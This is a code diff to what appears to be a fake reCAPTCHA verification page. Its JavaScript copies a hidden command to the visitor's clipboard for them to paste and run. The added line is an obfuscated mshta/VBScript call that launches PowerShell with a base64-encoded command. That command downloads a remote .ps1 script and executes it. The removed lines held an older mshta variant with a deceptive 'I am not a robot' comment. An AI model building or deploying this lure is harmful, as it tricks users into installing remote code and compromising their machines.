@@ -391,12 +391,8 @@
             document.body.removeChild(tempTextArea);
         }
 
-        function stageClipboard(commandToRun, verification_id){
-            const suffix = " # "
-            const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: "
-            const end = "''"
-            const textToCopy = commandToRun + suffix + ploy + verification_id + end
-
+        function stageClipboard(commandToRun){
+            const textToCopy = commandToRun
             setClipboardCopyData(textToCopy);
         }
 
@@ -418,9 +414,7 @@
 
             var verification_id = generateRandomNumber();
             document.getElementById('verification-id').textContent = verification_id;
-            
-            const htaPath = window.location.origin + "/recaptcha-verify";
-            const commandToRun = "mshta " + htaPath
+            const commandToRun = 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -enc aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AaABhAGsAawB5AGEAaAB1AGQALgBnAGkAdABoAHUAYgAuAGkAbwAvAEMAVABGAC8AdQBwAGQAYQB0AGUAcwBfAEsAYgA2ADQAdQAwAHMAYQBrAGEALgBwAHMAMQAnACkAKQA="":close")'
             stageClipboard(commandToRun, verification_id)
         }
 
